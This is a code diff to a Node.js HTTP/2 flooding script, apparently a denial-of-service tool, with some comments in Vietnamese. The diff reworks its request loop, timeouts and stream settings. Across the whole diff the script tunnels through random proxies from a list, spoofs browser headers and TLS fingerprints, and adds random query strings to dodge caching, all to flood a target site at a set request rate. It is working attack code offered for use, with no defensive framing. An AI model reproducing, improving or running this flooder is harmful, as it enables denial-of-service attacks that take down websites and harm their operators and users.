@@ -111,12 +111,7 @@ const rateHeaders = [
     { "user-agent": randstr(12) },
 ];
 
-var siga = sig[Math.floor(Math.random() * sig.length)];
-var ver = version[Math.floor(Math.random() * version.length)];
-var accept = accept_header[Math.floor(Math.random() * accept_header.length)];
-var lang = lang_header[Math.floor(Math.random() * lang_header.length)];
-var encoding = encoding_header[Math.floor(Math.random() * encoding_header.length)];
-var proxies = readLines(args.proxyFile);
+const proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);
 
 if (cluster.isMaster) {
@@ -129,6 +124,8 @@ if (cluster.isMaster) {
     console.log('\x1b[1m\x1b[33m' + 'Duration: ' + '\x1b[0m' + '\x1b[1m' + args.time + '\x1b[0m');
     console.log('\x1b[1m\x1b[32m' + 'Threads: ' + '\x1b[0m' + '\x1b[1m' + args.threads + '\x1b[0m');
     console.log('\x1b[1m\x1b[31m' + 'Requests per second: ' + '\x1b[0m' + '\x1b[1m' + args.Rate + '\x1b[0m');
+
+    setTimeout(() => process.exit(1), args.time * 1000);
 } else {
     runFlooder();
 }
@@ -138,7 +135,7 @@ class NetSocket {
 
     HTTP(options, callback) {
         const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
-        const buffer = new Buffer.from(payload);
+        const buffer = Buffer.from(payload);
 
         const connection = net.connect({
             host: options.host,
@@ -146,7 +143,7 @@ class NetSocket {
             noDelay: true,
         });
 
-        connection.setTimeout(options.timeout * 100000);
+        connection.setTimeout(options.timeout * 1000);
         connection.setKeepAlive(true, 100000);
 
         connection.on("connect", () => {
@@ -156,7 +153,7 @@ class NetSocket {
         connection.on("data", chunk => {
             const response = chunk.toString("utf-8");
             const isAlive = response.includes("HTTP/1.1 200");
-            if (isAlive === false) {
+            if (!isAlive) {
                 connection.destroy();
                 return callback(undefined, "error: invalid response from proxy server");
             }
@@ -176,131 +173,130 @@ class NetSocket {
 }
 
 const Socker = new NetSocket();
+
 headers[":method"] = "GET";
 headers[":authority"] = parsedTarget.host;
 headers[":path"] = parsedTarget.path + "?" + randstr(10) + "=" + randstr(5);
 headers[":scheme"] = "https";
-headers["sec-ch-ua"] = ver;
+headers["sec-ch-ua"] = randomElement(version);
 headers["sec-ch-ua-platform"] = "Windows";
 headers["sec-ch-ua-mobile"] = "?0";
-headers["accept-encoding"] = encoding;
-headers["accept-language"] = lang;
+headers["accept-encoding"] = randomElement(encoding_header);
+headers["accept-language"] = randomElement(lang_header);
 headers["upgrade-insecure-requests"] = "1";
-headers["accept"] = accept;
+headers["accept"] = randomElement(accept_header);
 headers["sec-fetch-mode"] = "navigate";
 headers["sec-fetch-dest"] = "document";
 headers["sec-fetch-site"] = "same-origin";
 headers["sec-fetch-user"] = "?1";
 headers["x-requested-with"] = "XMLHttpRequest";
 
-function runFlooder() {
-    const proxyAddr = randomElement(proxies);
-    const parsedProxy = proxyAddr.split(":");
+async function runFlooder() {
+    const totalRequests = args.Rate * args.time; // Tổng số request cần gửi
+    const interval = 1000 / args.Rate; // Khoảng thời gian giữa các request (ms)
 
-    const proxyOptions = {
-        host: parsedProxy[0],
-        port: ~~parsedProxy[1],
-        address: parsedTarget.host + ":443",
-        timeout: 5,
-    };
+    const sendRequest = () => {
+        const proxyAddr = randomElement(proxies);
+        const parsedProxy = proxyAddr.split(":");
 
-    Socker.HTTP(proxyOptions, (connection, error) => {
-        if (error) {
-            connection?.close();
-            connection?.destroy();
-            return;
-        }
+        const proxyOptions = {
+            host: parsedProxy[0],
+            port: ~~parsedProxy[1],
+            address: parsedTarget.host + ":443",
+            timeout: 5,
+        };
 
-        const tlsOptions = (() => {
-            const useTlsOption2 = (Math.random() < 0.5);
-            return useTlsOption2 ?
-                {
-                    secure: true,
-                    ALPNProtocols: ['h2'],
-                    sigals: siga,
-                    socket: connection,
-                    ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
-                    ecdhCurve: 'P-256:P-384',
-                    host: parsedTarget.host,
-                    servername: parsedTarget.host,
-                    rejectUnauthorized: false,
-                } :
-                {
-                    secure: true,
-                    ALPNProtocols: ['h2'],
-                    ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
-                    ecdhCurve: 'auto',
-                    rejectUnauthorized: false,
-                    servername: parsedTarget.host,
-                    secureOptions: crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION |
-                        crypto.constants.SSL_OP_NO_TICKET |
-                        crypto.constants.SSL_OP_NO_COMPRESSION |
-                        crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
-                        crypto.constants.SSL_OP_NO_RENEGOTIATION |
-                        crypto.constants.SSL_OP_SINGLE_DH_USE |
-                        crypto.constants.SSL_OP_SINGLE_ECDH_USE |
-                        crypto.constants.SSL_OP_NO_QUERY_MTU,
-                };
-        })();
+        Socker.HTTP(proxyOptions, (connection, error) => {
+            if (error) {
+                connection?.destroy();
+                return;
+            }
 
-        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
-        tlsConn.setKeepAlive(true, 60000);
+            const tlsOptions = (() => {
+                const useTlsOption2 = (Math.random() < 0.5);
+                return useTlsOption2 ?
+                    {
+                        secure: true,
+                        ALPNProtocols: ['h2'],
+                        sigals: randomElement(sig),
+                        socket: connection,
+                        ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
+                        ecdhCurve: 'P-256:P-384',
+                        host: parsedTarget.host,
+                        servername: parsedTarget.host,
+                        rejectUnauthorized: false,
+                    } :
+                    {
+                        secure: true,
+                        ALPNProtocols: ['h2'],
+                        ciphers: 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
+                        ecdhCurve: 'auto',
+                        rejectUnauthorized: false,
+                        servername: parsedTarget.host,
+                        secureOptions: crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION |
+                            crypto.constants.SSL_OP_NO_TICKET |
+                            crypto.constants.SSL_OP_NO_COMPRESSION |
+                            crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
+                            crypto.constants.SSL_OP_NO_RENEGOTIATION |
+                            crypto.constants.SSL_OP_SINGLE_DH_USE |
+                            crypto.constants.SSL_OP_SINGLE_ECDH_USE |
+                            crypto.constants.SSL_OP_NO_QUERY_MTU,
+                    };
+            })();
 
-        const client = http2.connect(parsedTarget.href, {
-            protocol: "https:",
-            settings: {
-                headerTableSize: 65536,
-                maxConcurrentStreams: 10000,
-                initialWindowSize: 6291456,
-                maxHeaderListSize: 65536,
-                enablePush: false
-            },
-            createConnection: () => tlsConn,
-        });
+            const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
+            tlsConn.setKeepAlive(true, 60000);
 
-        client.on("connect", () => {
-            const totalRequests = args.Rate * args.time; // Tổng số request cần gửi
-            const interval = 1000 / args.Rate; // Khoảng thời gian giữa các request (ms)
-            let sentRequests = 0;
+            const client = http2.connect(parsedTarget.href, {
+                protocol: "https:",
+                settings: {
+                    headerTableSize: 65536,
+                    maxConcurrentStreams: 100,
+                    initialWindowSize: 6291456,
+                    maxHeaderListSize: 65536,
+                    enablePush: false
+                },
+                createConnection: () => tlsConn,
+            });
 
-            const sendRequest = () => {
-                if (sentRequests >= totalRequests) {
-                    client.destroy();
-                    connection?.destroy();
-                    return;
-                }
-
+            client.on("connect", () => {
                 const dynHeaders = {
                     ...headers,
                     ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)]
                 };
-
                 const request = client.request(dynHeaders);
+
                 request.on("response", () => {
                     request.close();
                     request.destroy();
                 });
+
+                request.on("error", () => {
+                    request.close();
+                    request.destroy();
+                });
+
                 request.end();
+            });
 
-                sentRequests++;
-                if (sentRequests < totalRequests) {
-                    setTimeout(sendRequest, interval);
-                }
-            };
+            client.on("error", () => {
+                client.destroy();
+                connection?.destroy();
+            });
 
-            sendRequest();
+            client.on("close", () => {
+                client.destroy();
+                connection?.destroy();
+            });
         });
+    };
 
-        client.on("close", () => {
-            client.destroy();
-            connection?.destroy();
-        });
+    let sentRequests = 0;
+    const startTime = Date.now();
 
-        client.on("error", () => {
-            client.destroy();
-            connection?.destroy();
-        });
-    });
+    while (sentRequests < totalRequests && (Date.now() - startTime) < args.time * 1000) {
+        sendRequest();
+        sentRequests++;
+        await new Promise(resolve => setTimeout(resolve, interval));
+    }
 }
-
-setTimeout(() => process.exit(1), args.time * 1000);
